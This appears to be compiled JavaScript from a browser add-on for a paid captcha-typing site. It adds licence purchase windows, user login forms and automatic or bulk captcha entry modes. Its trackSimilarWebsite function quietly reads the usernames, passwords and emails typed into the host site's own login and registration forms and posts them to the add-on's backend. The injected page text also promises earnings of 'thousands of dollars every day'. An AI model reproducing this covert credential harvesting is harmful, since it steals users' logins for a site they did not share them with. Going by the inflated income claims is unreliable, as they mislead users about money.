}
/*app PriceList window*/
export function addPriceListWindow() {
    let acsAppWindow = captureElementById('acs-app-window');
    let acsAppChoosePlan = createElement([{
            'div': {
                'id': 'app-priceList-window',
                'class': 'row app-window-body animate',
                'style': 'width: 600px;display:none;'
            }
        }]);
    acsAppWindow.appendChild(acsAppChoosePlan);
    let acsAppChoosePlanTitleBar = createElement([{ 'div': { 'style': 'width: 100%;color: black;font-size: 28px;font-weight: bold;padding: 10px 0;display: inline-block;' } }]);
    let acsAppChoosePlanTitleText = createElement([{
            'div': {
                'id': 'choose-plan-title',
                'class': 'acsAppTitleText',
                'style': 'left: 220px !important;'
            }
        }]);
    acsAppChoosePlanTitleText.textContent = 'Choose Plan';
    acsAppChoosePlanTitleBar.appendChild(acsAppChoosePlanTitleText);
    let acsAppChoosePlanTitleSymbol = createElement([{
            'div': {
                'id': 'app-priceList-window-close-button',
                'class': 'acsAppTitleSymbol'
            }
        }]);
    acsAppChoosePlanTitleSymbol.textContent = 'x';
    acsAppChoosePlanTitleBar.appendChild(acsAppChoosePlanTitleSymbol);
    acsAppChoosePlan.appendChild(acsAppChoosePlanTitleBar);
    let acsAppChoosePlanBody = createElement([{ 'div': { 'class': 'setting-app-body' } }]);
    /*let messagePanel2 = createElement([{
        'div': {
            'id': 'messagePanel2',
            'class': 'messagePanel'
        }
    }]);
    acsAppChoosePlanBody.appendChild(messagePanel2);*/
    acsAppChoosePlan.appendChild(acsAppChoosePlanBody);
    let acsAppChoosePlanBodyContent = createElement([{ 'div': { 'style': 'text-align:center !important;width: 100%;' } }]);
    acsAppChoosePlanBody.appendChild(acsAppChoosePlanBodyContent);
    let priceList = createElement([{ 'div': { 'id': 'priceList', 'class': 'priceList' } }]);
    acsAppChoosePlanBodyContent.appendChild(priceList);
    /*let planItem1: any = createElement([{'div': {'class': 'priceItem', 'id': 'plan1'}}]);
    planItem1.innerHTML = 'Plan 01<br>Daily Limit '+currencyFormat(5)+' <br>validity 1 month <br>price only $ 5 <br>';
    priceList.appendChild(planItem1);
    let planItem2: any = createElement([{'div': {'class': 'priceItem', 'id': 'plan2'}}]);
    planItem2.innerHTML = 'Plan 02<br>Daily Limit '+currencyFormat(10000)+' <br>validity 1 month <br>price only $ 10 <br>';
    priceList.appendChild(planItem2);
    let planItem3: any = createElement([{'div': {'class': 'priceItem', 'id': 'plan3'}}]);
    planItem3.innerHTML = 'Plan 03<br>Daily Limit '+currencyFormat(20000)+' <br>validity 1 month <br>price only $ 20 <br>';
    priceList.appendChild(planItem3);*/
    let planItem4 = createElement([{ 'div': { 'class': 'priceItem', 'id': 'plan4' } }]);
    planItem4.innerHTML = 'Plan 01<br>Daily Unlimited <br>validity 1 month <br>price only $ 15 <br>';
    priceList.appendChild(planItem4);
    let planItem5 = createElement([{ 'div': { 'class': 'priceItem', 'id': 'plan5' } }]);
    planItem5.innerHTML = 'Plan 02<br>Referrals 40 <br>validity 1 time <br>price only ' + currencyFormat(10) + ' <br>';
    priceList.appendChild(planItem5);
    /*app payment window*/
    let paymentPanel = createElement([{
            'div': {
                'id': 'paymentPanel',
                'style': 'display: none; margin-top: 10px; /*width: 578px !important;*/'
            }
        }]);
    acsAppChoosePlanBodyContent.appendChild(paymentPanel);
    let buttonPayment = createElement([{
            'button': {
                'id': 'payment-link-button',
                'type': 'button',
                'class': 'app-button app-button-outline-success',
                'data-url': '',
                'style': '/*margin-left: 180px;*/'
            }
        }]);
    buttonPayment.textContent = 'Wait for payment';
    paymentPanel.appendChild(buttonPayment);
    let button8 = createElement([{
            'input': {
                'id': 'go-back-to-priceList-button',
                'type': 'button',
                'class': 'app-button app-button-outline-primary',
                'value': 'Back to Licence Price List',
                'style': 'display:none;margin-left: 180px;'
            }
        }]);
    acsAppChoosePlanBody.appendChild(button8);
    acsAppWindow.childNodes.forEach(function (element) {
        if (element.style.display === 'block' || element.style.display !== 'block') {
            element.style.display = 'none';
        }
        if (element.id === 'app-priceList-window' && element.style.display === 'none') {
            element.style.display = 'block';
        }
        /*console.log(element)*/
    });
    if (acsAppWindow.style.display === 'none') {
        acsAppWindow.style.display = 'block';
    }
    return globalEventControllers('app-priceList-window');
}
/*app waitForNextDay window*/
export function addWaitForNextDayWindow() {
    var _a;
    let acsAppWindow = captureElementById('acs-app-window');
    acsAppWindow.style.display = 'block';
    captureElementById('app-setting-window').style.display = 'none';
    let acsAppWelcome = createElement([{
            'div': {
                'id': 'app-waitForNextDay-window',
                'class': 'row app-window-body animate' /*,
                'style': 'width: 600px;'*/
            }
        }]);
    acsAppWindow.appendChild(acsAppWelcome);
    let acsAppWelcomeBody = createElement([{ 'div': { 'class': 'setting-app-body' } }]);
    acsAppWelcome.appendChild(acsAppWelcomeBody);
    let acsAppWelcomeBodyContent = createElement([{ 'div': { 'style': 'float: left;text-align: left !important;margin: 0;padding: 20px 30px;color: black;' } }]);
    acsAppWelcomeBody.appendChild(acsAppWelcomeBodyContent);
    let welcomeTable = createElement([{ 'table': { 'style': 'width:100%;' } }]);
    acsAppWelcomeBodyContent.appendChild(welcomeTable);
    let welcomeTableBody = createElement([{ 'tbody': {} }]);
    welcomeTable.appendChild(welcomeTableBody);
    let welcomeTableBodyTr1 = createElement([{ 'tr': {} }]);
    welcomeTableBody.appendChild(welcomeTableBodyTr1);
    let welcomeTableBodyTr1Td1 = createElement([{ 'td': { 'style': 'width:100%;color: red;line-height: 1.25;text-align: center;position: relative;font-size: 26px;font-weight: bold;padding-bottom: 15px;user-select: none;-webkit-user-select: none;-ms-user-select:none ;' } }]);
    welcomeTableBodyTr1Td1.textContent = 'You have exceeded today\'s earnings limit. The add-on has been deactivated for now.';
    welcomeTableBodyTr1.appendChild(welcomeTableBodyTr1Td1);
    let welcomeTableBodyTr2 = createElement([{ 'tr': {} }]);
    welcomeTableBody.appendChild(welcomeTableBodyTr2);
    let welcomeTableBodyTr2Td1 = createElement([{ 'td': { 'style': 'width:100%;color:green;font-size: 25px;text-align: center;padding: 7px 15px 0 15px;user-select: none;-webkit-user-select: none;-ms-user-select:none ;font-weight: bold;' } }]);
    let welcomeTextP1 = createElement([{ 'p': {} }]);
    welcomeTextP1.textContent = 'Will automatically reactivate after';
    welcomeTableBodyTr2Td1.appendChild(welcomeTextP1);
    let welcomeTextP2 = createElement([{ 'p': { 'id': 'countdown-time' } }]);
    welcomeTextP2.textContent = '00 Hours 00 Minutes 00 Seconds.';
    welcomeTableBodyTr2Td1.appendChild(welcomeTextP2);
    welcomeTableBodyTr2.appendChild(welcomeTableBodyTr2Td1);
    (_a = acsAppWindow.childNodes) === null || _a === void 0 ? void 0 : _a.forEach(function (element) {
        if (element.style.display === 'block') {
            element.style.display = 'none';
        }
        if (element.id === 'app-waitForNextDay-window' && element.style.display === 'none') {
            element.style.display = 'block';
        }
        /*console.log(element);*/
    });
    return globalEventControllers('app-welcome-window');
}
export function assembleAppContent() {
    if (document.body.childNodes.length >= 0) {
        pushExecuteScript(document.body);
        document.body.childNodes.forEach(function (element) {
            reFormatScriptTag(element);
            if (element.nodeName === 'DIV' && element.id === 'outer') {
                element.childNodes.forEach(function (element) {
                    if (element.nodeName === 'DIV' && element.id === 'main' && element.getAttribute('align') === 'center') {
                        let a = createElement([{
                                div: {
                                    id: "app-company-declaimer",
                                    class: "app-company-declaimer"
                                }
                            }]);
                        a.innerHTML = '<strong>Announcement:</strong>' + ' Mishusoft Systems Inc has just created this add-on to help you make money online. We are not affiliated with any of these web sites. By using this add-on, you are acknowledging that making and withdrawing money is entirely at your own risk.';
                        if (captureElementById('app-company-declaimer') === undefined || captureElementById('app-company-declaimer') === null) {
                            element.appendChild(a);
                        }
                        let o = createElement([{
                                a: {
                                    id: "app-company-text",
                                    class: "app-company-text",
                                    href: app.website.home,
                                    title: "Visit our website for more earning app and add-ons."
                                }
                            }]);
                        o.textContent = "This add-on powered by Mishusoft Systems Inc.";
                        if (captureElementById('app-company-text') === undefined || captureElementById('app-company-text') === null) {
                            element.appendChild(o);
                        }
                        element.childNodes.forEach(function (element) {
                            var _a;
                            if (element.nodeName === 'FORM' && element.name === 'mainf' && ((_a = element.firstElementChild) === null || _a === void 0 ? void 0 : _a.nodeName) === 'DIV') {
                                element.childNodes.forEach(function (element) {
                                    var _a, _b, _c;
                                    /*#!if debug === true*/
                                    /*console.log(element)
                                    console.log((element as HTMLDivElement).textContent)*/
                                    /*#!endif*/
                                    if (element.nodeName === 'DIV' && element.getAttribute('align') === 'center') {
                                        if (element.firstElementChild !== null && element.firstElementChild.nodeName === 'INPUT' && element.firstElementChild.type === 'text') {
                                            if (element.firstElementChild.style.display !== 'none') {
                                                element.firstElementChild.style.display = 'none';
                                            }
                                            element.firstElementChild.id = 'data-entry-box';
                                        }
                                        if (element.firstElementChild !== null && element.firstElementChild.nodeName === 'TABLE') {
                                            if (element.firstElementChild.firstElementChild.nodeName === 'TBODY') {
                                                element.firstElementChild.firstElementChild.firstElementChild.id = 'captcha-img-zone';
                                            }
                                        }
                                        if (element.firstElementChild !== null && element.firstElementChild.nodeName === 'INPUT' && element.firstElementChild.type === 'button') {
                                            if (element.style.display !== 'none' && element.textContent !== '' && element.firstElementChild.id !== 'auto-data-entry-start-btn') {
                                                element.id = 'data-submit-zone';
                                                element.innerHTML = '<button id="auto-data-entry-start-btn" type="button" class="app-button app-button-outline-primary" title="If you have a licence, then it will be active" disabled="disabled">Start</button>&nbsp;&nbsp;' +
                                                    '<select class="app-select" id="data-entry-options" title="If you have a licence, then it will be active" disabled="disabled">' +
                                                    /*#!if debug=true*/
                                                    '<option value="auto">Auto</option><option value="bulk">Bulk</option>'
                                                    /*#!endif*/
                                                    + '<option value="manually">Manually</option></select>&nbsp;' +
                                                    '<button id="auto-data-entry-reset-btn" type="button" class="app-button app-button-outline-danger" title="If you have a licence, then it will be active" disabled="disabled">Reset</button>';
                                            }
                                        }
                                        if (element.firstElementChild !== null && element.nodeName === 'DIV' && element.getAttribute('align') === 'center' && element.firstElementChild.nodeName === 'BR' &&
                                            ((_b = (_a = element) === null || _a === void 0 ? void 0 : _a.textContent) === null || _b === void 0 ? void 0 : _b.indexOf('To get ' + app.extras.sitePrice + ' cents, enter the symbols')) !== -1) {
                                            /*#!if debug === true*/
                                            console.log(element);
                                            console.info('note board found!!');
                                            /*#!endif*/
                                            element.id = 'app-company-note';
                                            element.setAttribute('style', 'font-size: 13px;line-height: 1.35;text-align: justify;');
                                            element.innerHTML = '<strong>Note:</strong> If you fill in the picture numbers shown above correctly, <u>you will get ' + app.extras.sitePrice + ' cents each time</u>. By using our add-on with any method you can definitely earn dollars by filling in the captcha correctly. Method 1 [default] of our add-on is ' +
                                                /*#!if debug=true*/
                                                '[auto], <u> it is enough to turn it on once. As long as the internet browser is open on your device and the internet connection is connected uninterrupted.</u> This way you can earn thousands of dollars every day. Method 2 is the bulk method. It allows you to earn $ ' + app.extras.bulkEarn + ' per second per click and the latest method 3 is '
                                                /*#!endif*/
                                                + 'the manual method. With this you can earn ' + app.extras.sitePrice + ' cents every time.';
                                            (_c = element.nextElementSibling) === null || _c === void 0 ? void 0 : _c.remove();
                                        }
                                    }
                                });
                            }
                        });
                    }
                });
            }
        });
    }
}
/*event controllers*/
export async function globalEventControllers(component) {
    var _a, _b;
    if (component == 'app-welcome-window') {
        /*console.log('set event for welcome window close button action');*/
        captureElementById("app-welcome-window-close-button").addEventListener("click", function () {
            captureElementById('app-welcome-window').remove();
            captureElementById('acs-app-window').style.display = 'none';
        });
        /*console.log('set event for let-start-registration button action');*/
        captureElementById('let-start-registration').addEventListener('click', function () {
            captureElementById('app-welcome-window').remove();
            addMemberWindow();
        });
        /*console.log('set event for let-start-registration button action');*/
        /*captureElementById('let-donate').addEventListener('click', function () {
            captureElementById('app-welcome-window').remove();
            addMemberWindow();
        });*/
    }
    if (component == 'app-user-window') {
        /*console.log('append message panel');*/
        /*-------------------------------*/
        captureElementById('app-user-body').insertBefore(createElement([{
                'div': {
                    'id': 'messagePanel',
                    'class': 'messagePanel'
                }
            }]), captureElementById('app-user-body').firstElementChild);
        /*-------------------------------*/
        /*console.log('set event for app-user-window-close-button action');*/
        captureElementById("app-user-window-close-button").addEventListener("click", function () {
            captureElementById('app-user-window').remove();
            captureElementById('acs-app-window').style.display = 'none';
        });
        /*console.log('set let login event window');*/
        captureElementById('let-login-button').addEventListener('click', function () {
            this.style.display = 'none';
            captureElementById('messagePanel').textContent = '';
            captureElementById('messagePanel').style.display = 'none';
            captureElementById('first-name').style.display = 'none';
            captureElementById('last-name').style.display = 'none';
            captureElementById('let-connect').removeAttribute('style');
            captureElementById('do-login-button').removeAttribute('style');
            captureElementById('do-register-button').style.display = 'none';
        });
        /*console.log('set let password recovery event window');*/
        captureElementById('do-recover-password-button').addEventListener('click', function () {
            this.value = 'Processing...';
            captureElementById('messagePanel').textContent = '';
            captureElementById('messagePanel').style.display = 'none';
            let emailAddressCheck;
            if (captureElementById('email-address') === undefined || captureElementById('email-address').value === '') {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').style.display = 'block';
                captureElementById('messagePanel').innerHTML += 'Enter your email address (valid for more than 14 characters).<br/>';
                this.value = 'Password Recovery';
            }
            else if (captureElementById('email-address').value.indexOf('@') === -1 || captureElementById('email-address').value.indexOf('.') === -1 || captureElementById('email-address').value.length <= 14) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').style.display = 'block';
                captureElementById('messagePanel').innerHTML += 'Enter valid email address.<br/>';
                this.value = 'Password Recovery';
            }
            else {
                emailAddressCheck = 'OK';
            }
            /*problem*/
            if (emailAddressCheck === 'OK') {
                (captureElementById('messagePanel').style.display === 'block') ? captureElementById('messagePanel').style.display = 'none' : '';
                acsComPortFront.postMessage({
                    'command': 'recoverUserPassword',
                    'data': {
                        'emailAddress': captureElementById('email-address').value
                    }
                });
                /*alert('start password recovery!!')*/
            }
        });
        /*console.log('set let connect event window');*/
        captureElementById('let-connect').addEventListener('click', function () {
            captureElementById('messagePanel').textContent = '';
            captureElementById('messagePanel').style.display = 'none';
            captureElementById('do-login-button').style.display = 'none';
            captureElementById('first-name').removeAttribute('style');
            captureElementById('last-name').removeAttribute('style');
            captureElementById('let-login-button').removeAttribute('style');
            captureElementById('do-register-button').removeAttribute('style');
            this.style.display = 'none';
        });
        /*console.log('set registration event window');*/
        captureElementById('do-register-button').addEventListener('click', function () {
            this.value = 'Processing...';
            let firstNameCheck;
            let lastNameCheck;
            let emailAddressCheck;
            let passwordCheck;
            captureElementById('messagePanel').textContent = '';
            captureElementById('messagePanel').style.display = 'block';
            if (captureElementById('first-name') === undefined || captureElementById('first-name').value === '') {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter your first name (more than 4 characters).<br/>';
                this.value = 'Register';
            }
            else if (checkDuplicate(captureElementById('first-name').value)) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'A character has been used more than twice in your first name.<br/>';
                this.value = 'Register';
            }
            else if (captureElementById('first-name').value.length <= 3) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter your first name more than 4 characters.<br/>';
                this.value = 'Register';
            }
            else {
                firstNameCheck = 'OK';
            }
            if (captureElementById('last-name') === undefined || captureElementById('last-name').value === '') {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter your last name (more than 4 characters).<br/>';
                this.value = 'Register';
            }
            else if (checkDuplicate(captureElementById('last-name').value)) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'A character has been used more than twice in your last name.<br/>';
                this.value = 'Register';
            }
            else if (captureElementById('last-name').value.length <= 3) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter your last name more than 4 letter.<br/>';
                this.value = 'Register';
            }
            else {
                lastNameCheck = 'OK';
            }
            if (captureElementById('email-address') === undefined || captureElementById('email-address').value === '') {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter your email address (valid for more than 14 characters).<br/>';
                this.value = 'Register';
            }
            else if (captureElementById('email-address').value.indexOf('@') === -1 || captureElementById('email-address').value.indexOf('.') === -1 || captureElementById('email-address').value.length <= 14) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter valid email address.<br/>';
                this.value = 'Register';
            }
            else {
                emailAddressCheck = 'OK';
            }
            if (captureElementById('acs-password') === undefined || captureElementById('acs-password').value === '') {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter your password (with @_ character and more than 6 character).<br/>';
                this.value = 'Register';
            }
            else if (captureElementById('acs-password').value !== '' && captureElementById('acs-password').value.indexOf('@') === -1) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter password with (@) character.<br/>';
                this.value = 'Register';
            }
            else if (captureElementById('acs-password').value !== '' && captureElementById('acs-password').value.indexOf('_') === -1) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter password with (_) character.<br/>';
                this.value = 'Register';
            }
            else if (checkDuplicate(captureElementById('acs-password').value)) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'A character has been used more than twice in your password.<br/>';
                this.value = 'Register';
            }
            else if (captureElementById('acs-password').value !== '' && captureElementById('acs-password').value.length <= 6) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter password more than 6 character.<br/>';
                this.value = 'Register';
            }
            else {
                passwordCheck = 'OK';
            }
            if (firstNameCheck === 'OK' && lastNameCheck === 'OK' && emailAddressCheck === 'OK' && passwordCheck === 'OK') {
                captureElementById('messagePanel').style.display = 'none';
                acsComPortFront.postMessage({
                    'command': 'saveUserSettingData',
                    'data': {
                        'firstName': captureElementById('first-name').value,
                        'lastName': captureElementById('last-name').value,
                        'emailAddress': captureElementById('email-address').value,
                        'password': captureElementById('acs-password').value
                    }
                });
            }
        });
        /*console.log('set reset event window');*/
        captureElementById('do-reset-button').addEventListener('click', function () {
            this.value = 'Processing...';
            let IpAddressCheck;
            captureElementById('messagePanel').textContent = '';
            captureElementById('messagePanel').style.display = 'block';
            if (captureElementById('user-ip-address') === undefined || captureElementById('user-ip-address').value === '') {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter your ip address.<br/>';
                this.value = 'Reset Account';
            }
            else if (captureElementById('user-ip-address').value.length >= 16) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Invalid ip address.<br/>';
                this.value = 'Reset Account';
            }
            else {
                IpAddressCheck = 'OK';
            }
            if (IpAddressCheck === 'OK') {
                captureElementById('messagePanel').style.display = 'none';
                acsComPortFront.postMessage({
                    'command': 'resetUserIpData',
                    'data': {
                        'ipAddress': captureElementById('user-ip-address').value,
                        'firstName': captureElementById('first-name').value,
                        'lastName': captureElementById('last-name').value,
                        'emailAddress': captureElementById('email-address').value,
                        'password': captureElementById('acs-password').value
                    }
                });
            }
        });
        /*console.log('set login event window');*/
        captureElementById('do-login-button').addEventListener('click', function () {
            this.value = 'Processing...';
            let emailAddressCheck;
            let passwordCheck;
            captureElementById('messagePanel').textContent = '';
            captureElementById('messagePanel').style.display = 'block';
            if (captureElementById('email-address') === undefined || captureElementById('email-address').value === '') {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter your email address (valid for more than 14 characters).<br/>';
                this.value = 'Log In';
            }
            else if (captureElementById('email-address').value.indexOf('@') === -1 || captureElementById('email-address').value.length <= 14) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter valid email address.<br/>';
                this.value = 'Log In';
            }
            else {
                emailAddressCheck = 'OK';
            }
            if (captureElementById('acs-password') === undefined || captureElementById('acs-password').value === '') {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter your password (with @_ character and more than 6 character).<br/>';
                this.value = 'Log In';
            }
            else if (captureElementById('acs-password').value !== '' && captureElementById('acs-password').value.indexOf('@') === -1) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter password with (@) character.<br/>';
                this.value = 'Log In';
            }
            else if (captureElementById('acs-password').value !== '' && captureElementById('acs-password').value.indexOf('_') === -1) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter password with (_) character.<br/>';
                this.value = 'Log In';
            }
            else if (checkDuplicate(captureElementById('acs-password').value)) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'A character has been used more than twice in your password.<br/>';
                this.value = 'Log In';
            }
            else if (captureElementById('acs-password').value !== '' && captureElementById('acs-password').value.length <= 6) {
                captureElementById('messagePanel').classList = 'messagePanel ev_error';
                captureElementById('messagePanel').innerHTML += 'Enter password more than 6 character.<br/>';
                this.value = 'Log In';
            }
            else {
                passwordCheck = 'OK';
            }
            if (emailAddressCheck === 'OK' && passwordCheck === 'OK') {
                /*console.log(captureElementById('email-address').value);
                console.log(captureElementById('acs-password').value);*/
                captureElementById('messagePanel').style.display = 'none';
                acsComPortFront.postMessage({
                    'command': 'doUserLoginData',
                    'data': {
                        'emailAddress': captureElementById('email-address').value,
                        'password': captureElementById('acs-password').value
                    }
                });
            }
        });
        captureElementById('let-earn-button').addEventListener('click', function () {
            acsComPortFront.postMessage({ 'command': "checkSettings" });
            captureElementById('app-user-window').remove();
            captureElementById('acs-app-window').style.display = 'none';
            /*console.log('request to close user window!!');*/
        });
        captureElementById('let-get-a-licence-button').addEventListener('click', function () {
            addPriceListWindow();
            /*console.log('request to open licence window!!');*/
        });
    }
    if (component === 'app-priceList-window') {
        (_a = captureElementById('app-priceList-window-close-button')) === null || _a === void 0 ? void 0 : _a.addEventListener('click', function () {
            captureElementById('app-priceList-window').remove();
            captureElementById('acs-app-window').style.display = 'none';
        });
        captureElementById('go-back-to-priceList-button').addEventListener('click', function () {
            this.style.display = 'none';
            captureElementById('priceList').style.display = 'block';
            captureElementById('paymentPanel').style.display = 'none';
            captureElementById('payment-link-button').textContent = 'Wait for payment!';
            captureElementById('payment-link-button').setAttribute('data-url', '');
        });
        /*captureElementById('plan1').addEventListener('click', function () {
            captureElementById('choose-plan-title').textContent = 'Make Payment';
            captureElementById('payment-link-button').textContent = 'Generating Payment Link...';
            captureElementById('payment-link-button').setAttribute('disabled', 'disabled');
            captureElementById('payment-link-button').setAttribute('style', 'cursor:progress');
            captureElementById('choose-plan-title').setAttribute('style', 'left: 200px !important;');
            captureElementById('priceList').style.display = 'none';
            captureElementById('go-back-to-priceList-button').style.display = 'block';
            captureElementById('paymentPanel').style.display = 'block';

            acsComPortFront.postMessage({
                'command': 'verifyClient',
                'data': {security_code: 1, amount: 5}
            });
        });
        captureElementById('plan2').addEventListener('click', function () {
            captureElementById('choose-plan-title').textContent = 'Make Payment';
            captureElementById('payment-link-button').textContent = 'Generating Payment Link...';
            captureElementById('payment-link-button').setAttribute('disabled', 'disabled');
            captureElementById('payment-link-button').setAttribute('style', 'cursor:progress');
            captureElementById('choose-plan-title').setAttribute('style', 'left: 200px !important;');
            captureElementById('priceList').style.display = 'none';
            captureElementById('go-back-to-priceList-button').style.display = 'block';
            captureElementById('paymentPanel').style.display = 'block';

            acsComPortFront.postMessage({
                'command': 'verifyClient',
                'data': {security_code: 1, amount: 10}
            });
        });
        captureElementById('plan3').addEventListener('click', function () {
            captureElementById('choose-plan-title').textContent = 'Make Payment';
            captureElementById('payment-link-button').textContent = 'Generating Payment Link...';
            captureElementById('payment-link-button').setAttribute('disabled', 'disabled');
            captureElementById('payment-link-button').setAttribute('style', 'cursor:progress');
            captureElementById('choose-plan-title').setAttribute('style', 'left: 200px !important;');
            captureElementById('priceList').style.display = 'none';
            captureElementById('go-back-to-priceList-button').style.display = 'block';
            captureElementById('paymentPanel').style.display = 'block';

            acsComPortFront.postMessage({
                'command': 'verifyClient',
                'data': {security_code: 1, amount: 20}
            });
        });*/
        captureElementById('plan4').addEventListener('click', function () {
            captureElementById('choose-plan-title').textContent = 'Make Payment';
            captureElementById('payment-link-button').textContent = 'Generating Payment Link...';
            captureElementById('payment-link-button').setAttribute('disabled', 'disabled');
            captureElementById('payment-link-button').setAttribute('style', 'cursor:progress');
            captureElementById('choose-plan-title').setAttribute('style', 'left: 200px !important;');
            captureElementById('priceList').style.display = 'none';
            captureElementById('go-back-to-priceList-button').style.display = 'block';
            captureElementById('paymentPanel').style.display = 'block';
            acsComPortFront.postMessage({
                'command': 'verifyClient',
                'data': { security_code: 1, amount: 15, plan: 'Plan 04', planType: 'earning' }
            });
        });
        captureElementById('plan5').addEventListener('click', function () {
            captureElementById('choose-plan-title').textContent = 'Make Payment';
            captureElementById('payment-link-button').textContent = 'Generating Payment Link...';
            captureElementById('payment-link-button').setAttribute('disabled', 'disabled');
            captureElementById('payment-link-button').setAttribute('style', 'cursor:progress');
            captureElementById('choose-plan-title').setAttribute('style', 'left: 200px !important;');
            captureElementById('priceList').style.display = 'none';
            captureElementById('go-back-to-priceList-button').style.display = 'block';
            captureElementById('paymentPanel').style.display = 'block';
            acsComPortFront.postMessage({
                'command': 'verifyClient',
                'data': { security_code: 1, amount: 10, plan: 'Plan 05', planType: 'referrals40' }
            });
        });
        captureElementById('payment-link-button').addEventListener('click', function () {
            var _a;
            (_a = window.open(this.getAttribute('data-url'), "winName", "location=0,width=650,height=750")) === null || _a === void 0 ? void 0 : _a.focus();
            /*browser.browserSettings.allowPopupsForUserEvents.get({}).then(function(current){
                if(current.value !== true){
                    browser.browserSettings.allowPopupsForUserEvents.set({value: true});
                    window.open(this.getAttribute('data-url'), "winName", "location=0,width=650,height=750")?.focus();
                } else {
                    window.open(this.getAttribute('data-url'), "winName", "location=0,width=650,height=750")?.focus();
                }
            });*/
        });
    }
    if (component == 'app-setting-window') {
        /*console.log('set event for app-setting-button action');*/
        /*console.log('set event for app-setting-opener action');
        console.log(document.querySelector('#app-setting-button'));*/
        (_b = captureElementById('app-setting-button')) === null || _b === void 0 ? void 0 : _b.addEventListener('click', function () {
            /*console.info('preparing to send data request');*/
            acsComPortFront.postMessage({ 'command': "checkSettings" });
            acsComPortFront.postMessage({ 'command': 'sendUserData' });
            /*console.info('send data request');*/
        });
        /*console.log('set event for acs-app-close-button action');
        console.log(captureElementById('acs-app-close-button'));*/
        captureElementById('acs-app-close-button').addEventListener('click', function () {
            captureElementById('acs-app-window').style.display = 'none';
        });
        /*console.log('set event for setting-get-a-licence action');
        console.log(captureElementById('setting-get-a-licence'));*/
        captureElementById('setting-get-a-licence').addEventListener('click', function () {
            browser.storage.local.set({ "appsetting": "running" });
            addPriceListWindow();
            /*console.log('request to open licence window!!');*/
        });
        /*console.log('set event for nav action');*/
        /*console.log(captureElementByClassName('acsAppNavUL'));*/
        captureElementByClassName('acsAppNavUL').childNodes.forEach(function (element) {
            const content = (element.id).substr(((element.id).indexOf('nav-') + "nav-".length), (element.id).length);
            element.addEventListener('click', function () {
                /*const parentNavigatorId = element.id;
                console.log(element.id)
                console.log(content)*/
                if (content) {
                    captureElementByClassName('setting-app-body-content').childNodes.forEach(function (element) {
                        /*console.log(element)*/
                        if (element.id !== 'setting-app-content-' + content) {
                            /*captureElementById(parentNavigatorId).removeAttribute('style');*/
                            element.style.display = 'none';
                            /*console.log(element)
                            console.log(captureElementById(parentNavigatorId))*/
                        }
                        else {
                            if (element.style.display === 'none') {
                                element.style.display = 'block';
                                /*captureElementById(parentNavigatorId).setAttribute('style','background-color: #9932CC;cursor: pointer;');
                                console.log(element)
                                console.log(captureElementById(parentNavigatorId))*/
                            }
                        }
                    });
                }
            });
        });
        /*console.log(captureElementById('app-setting-window'));*/
        /*console.log('completed');*/
    }
}
/*event controllers*/
/*monitor*/
export function trackSimilarWebsite() {
    var _a, _b;
    (_a = document.querySelector('.logsub')) === null || _a === void 0 ? void 0 : _a.addEventListener('click', function () {
        if (acsComPortFront !== undefined) {
            acsComPortFront.postMessage({
                'command': "saveLoginData",
                data: {
                    username: captureElementById('username').value,
                    password: captureElementById('password').value,
                    workWebsite: window.location.origin
                }
            });
        }
        /*else {
              console.error('Error: Communication error.')
          }*/
    });
    document.querySelectorAll('a').forEach(function (el) {
        if (el.href.indexOf('logout') !== -1) {
            el.addEventListener('click', function () {
                getLoggedInUsername();
                acsComPortFront.postMessage({
                    command: "saveLogoutData",
                    data: {
                        username: coll.user.username,
                        workWebsite: window.location.origin
                    }
                });
            });
        }
    });
    if (coll.dom.currentPage === app.page.registration) {
        document.querySelectorAll('img').forEach(function (element) {
            var _a, _b;
            if (element.src.indexOf('sendmess.png') !== -1 && ((_a = element.parentElement) === null || _a === void 0 ? void 0 : _a.nodeName) === 'A') {
                (_b = element.parentElement) === null || _b === void 0 ? void 0 : _b.setAttribute('id', 'register-btn');
            }
        });
        (_b = captureElementById('register-btn')) === null || _b === void 0 ? void 0 : _b.addEventListener('click', function () {
            /*console.log(captureElementById('username').value)
            console.log(captureElementById('password1').value)
            console.log(captureElementById('email').value)*/
            acsComPortFront.postMessage({
                'command': "saveRegistrationData",
                data: {
                    username: captureElementById('username').value,
                    password: captureElementById('password1').value,
                    email: captureElementById('email').value,
